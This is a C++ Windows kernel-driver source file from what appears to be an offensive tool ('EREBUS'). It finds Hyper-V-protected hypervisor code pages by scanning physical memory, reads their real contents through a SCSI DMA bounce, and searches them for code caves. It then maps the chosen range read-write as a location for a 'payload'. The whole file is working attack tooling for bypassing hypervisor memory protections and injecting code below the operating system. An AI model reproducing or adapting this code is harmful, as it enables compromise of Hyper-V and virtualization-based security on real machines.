#include "payload.hpp"

NTSTATUS ExecuteCPUIDEachProcessor()
{
    const ULONG numOfProcessors = KeQueryActiveProcessorCountEx(ALL_PROCESSOR_GROUPS);
    for (ULONG i = 0; i < numOfProcessors; i++)
    {
        PROCESSOR_NUMBER processorNumber;
        NTSTATUS status = KeGetProcessorNumberFromIndex(i, &processorNumber);
        if (!NT_SUCCESS(status))
            return status;

        GROUP_AFFINITY affinity;
        affinity.Group = processorNumber.Group;
        affinity.Mask = 1ULL << processorNumber.Number;
        affinity.Reserved[0] = affinity.Reserved[1] = affinity.Reserved[2] = 0;

        GROUP_AFFINITY oldAffinity;
        KeSetSystemGroupAffinityThread(&affinity, &oldAffinity);

        ExecuteCPUID();

        KeRevertToUserGroupAffinityThread(&oldAffinity);
    }

    return STATUS_SUCCESS;
}

void Sleep(int ms)
{
    LARGE_INTEGER interval;
    interval.QuadPart = -10 * 1000 * ms;
    KeDelayExecutionThread(KernelMode, FALSE, &interval);
}

// Hyper-V protects the hvix64 code pages: a CPU load through MmCopyMemory
// (MM_COPY_MEMORY_PHYSICAL) reads open-bus filler (0xFF) instead of the real
// bytes. All-ones pages are therefore candidates that may need a SCSI DMA
// bounce to be read for real.
BOOLEAN IsPageAllOnes(IN PVOID page) {
    for (UINT32 i = 0; i < PAGE_SIZE; i += sizeof(UINT64)) {
        if (*(PUINT64)((PUINT8)page + i) != MAXUINT64) {
            return FALSE;
        }
    }

    return TRUE;
}

BOOLEAN IsRangeAllOnes(IN PVOID page, IN SIZE_T size) {
    for (SIZE_T i = 0; i < size; i += sizeof(UINT64)) {
        if (*(PUINT64)((PUINT8)page + i) != MAXUINT64) {
            return FALSE;
        }
    }

    return TRUE;
}

typedef struct _EREBUS_PHYSICAL_MAPPING {
    PVOID VirtualAddress;
    PMDL Mdl;
    SIZE_T Size;
} EREBUS_PHYSICAL_MAPPING, *PEREBUS_PHYSICAL_MAPPING;

static NTSTATUS MapPhysicalRangeForBounce(IN PHYSICAL_ADDRESS physicalAddress, IN SIZE_T size, OUT PEREBUS_PHYSICAL_MAPPING mapping)
{
    RtlZeroMemory(mapping, sizeof(*mapping));

    if (!size ||
        (physicalAddress.QuadPart & (PAGE_SIZE - 1)) ||
        (size & (PAGE_SIZE - 1)) ||
        size > MAXULONG) {
        return STATUS_INVALID_PARAMETER;
    }

    PMDL mdl = IoAllocateMdl(NULL, (ULONG)size, FALSE, FALSE, NULL);
    if (!mdl) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    mdl->MdlFlags |= MDL_PAGES_LOCKED;

    PFN_NUMBER basePfn = (PFN_NUMBER)(physicalAddress.QuadPart >> PAGE_SHIFT);
    PFN_NUMBER* pfnArray = MmGetMdlPfnArray(mdl);
    SIZE_T pageCount = size >> PAGE_SHIFT;

    for (SIZE_T i = 0; i < pageCount; ++i) {
        pfnArray[i] = basePfn + i;
    }

    PVOID virtualAddress = MmMapLockedPagesSpecifyCache(
        mdl,
        KernelMode,
        MmNonCached,
        NULL,
        FALSE,
        NormalPagePriority);

    if (!virtualAddress) {
        IoFreeMdl(mdl);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    // Storport probes these aliases during SCSI direct I/O; keep them plain RW.
    NTSTATUS protectStatus = MmProtectMdlSystemAddress(mdl, PAGE_READWRITE);
    if (!NT_SUCCESS(protectStatus)) {
        MmUnmapLockedPages(virtualAddress, mdl);
        IoFreeMdl(mdl);
        return protectStatus;
    }

    mapping->VirtualAddress = virtualAddress;
    mapping->Mdl = mdl;
    mapping->Size = size;
    return STATUS_SUCCESS;
}

static VOID UnmapPhysicalBounceMapping(IN OUT PEREBUS_PHYSICAL_MAPPING mapping)
{
    if (!mapping) {
        return;
    }

    if (mapping->VirtualAddress && mapping->Mdl) {
        MmUnmapLockedPages(mapping->VirtualAddress, mapping->Mdl);
    }
    if (mapping->Mdl) {
        IoFreeMdl(mapping->Mdl);
    }

    RtlZeroMemory(mapping, sizeof(*mapping));
}

static BOOLEAN ScanPattern(IN PVOID page, IN PUINT8 pattern, IN const char* mask, IN SIZE_T pattern_length, OUT PVOID* found_address) {
    for (UINT32 i = 0; i <= PAGE_SIZE - pattern_length; ++i) {
        PUINT8 ptr = (PUINT8)page + i;
        BOOLEAN match = TRUE;

        for (SIZE_T j = 0; j < pattern_length; ++j) {
            if (mask[j] == 'x' && ptr[j] != pattern[j]) {
                match = FALSE;
                break;
            }
        }

        if (match) {
            if (found_address) {
                *found_address = ptr;
            }
            return TRUE;
        }
    }
    return FALSE;
}

NTSTATUS FindContinuousEmptyPagesInRange(IN PPHYSICAL_MEMORY_RANGE range, IN PDISK disk, IN UINT64 numPages, OUT PVOID* bufferAddress, OUT PEREBUS_PHYSICAL_MAPPING mappingOut, OUT PHYSICAL_ADDRESS* physicalAddress) {
    UINT64 bytesNeeded = numPages * PAGE_SIZE;
    UINT64 rangeStart = (UINT64)range->BaseAddress.QuadPart;
    UINT64 rangeEnd = rangeStart + (UINT64)range->NumberOfBytes.QuadPart;
    UINT64 scanStart = rangeStart;
    UINT64 scannedPages = 0;
    if (rangeEnd <= EREBUS_HYPERV_SCAN_FLOOR) {
        return STATUS_UNSUCCESSFUL;
    }
    if (scanStart < EREBUS_HYPERV_SCAN_FLOOR) {
        scanStart = EREBUS_HYPERV_SCAN_FLOOR;
    }
    if (rangeEnd - scanStart < bytesNeeded) {
        return STATUS_UNSUCCESSFUL;
    }

    PVOID buffer = MmAllocateContiguousMemory(PAGE_SIZE * numPages, PHYSICAL_ADDRESS{ .QuadPart = MAXULONG32 });
    if (!buffer) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    for (UINT64 currentAddress = scanStart; currentAddress + bytesNeeded <= rangeEnd; currentAddress += PAGE_SIZE) {
        ++scannedPages;
        UINT64 pfn = currentAddress >> PAGE_SHIFT;
        EREBUS_PHYSICAL_MAPPING mapping = { };

        MM_COPY_ADDRESS src;
        src.PhysicalAddress.QuadPart = pfn << PAGE_SHIFT;

        SIZE_T outSize;
        if (!NT_SUCCESS(MmCopyMemory(buffer, src, PAGE_SIZE * numPages, MM_COPY_MEMORY_PHYSICAL, &outSize)) ||
            outSize != PAGE_SIZE * numPages) {
            continue;
        }
        if (!IsRangeAllOnes(buffer, PAGE_SIZE * numPages)) {
            continue;
        }
        if (!NT_SUCCESS(MapPhysicalRangeForBounce(src.PhysicalAddress, PAGE_SIZE * numPages, &mapping))) {
            continue;
        }

        UINT64 failedPageIndex = 0;
        NTSTATUS bounceStatus = DiskCopyPagesEx(
            disk,
            buffer,
            mapping.VirtualAddress,
            numPages,
            &failedPageIndex);
        if (!NT_SUCCESS(bounceStatus)) {
            UnmapPhysicalBounceMapping(&mapping);
            if (failedPageIndex > 0) {
                currentAddress += failedPageIndex * PAGE_SIZE;
            }
            continue;
        }

        for (UINT32 j = 0; j < PAGE_SIZE * numPages; ++j) {
            PUINT8 ptr = (PUINT8)buffer + j;
            SIZE_T caveSize = 0;

            for (SIZE_T k = 0; (j + k) < PAGE_SIZE * numPages; ++k) {
                if (ptr[k] == 0x00 || ptr[k] == 0x90 || ptr[k] == 0xCC) {
                    caveSize++;
                }
                else {
                    break;
                }
            }
            if (caveSize >= PAGE_SIZE * numPages)
            {
                *physicalAddress = src.PhysicalAddress;
                *bufferAddress = (PUINT8)buffer;
                *mappingOut = mapping;
                DbgMsg("payload range selected: pa=%p pages=%llu",
                    physicalAddress->QuadPart,
                    numPages);
                return STATUS_SUCCESS;
            }
        }
        UnmapPhysicalBounceMapping(&mapping);
    }
    MmFreeContiguousMemory(buffer);
    DbgMsg("payload range search failed: pages=%llu scanned=%llu",
        numPages,
        scannedPages);
    return STATUS_UNSUCCESSFUL;
}
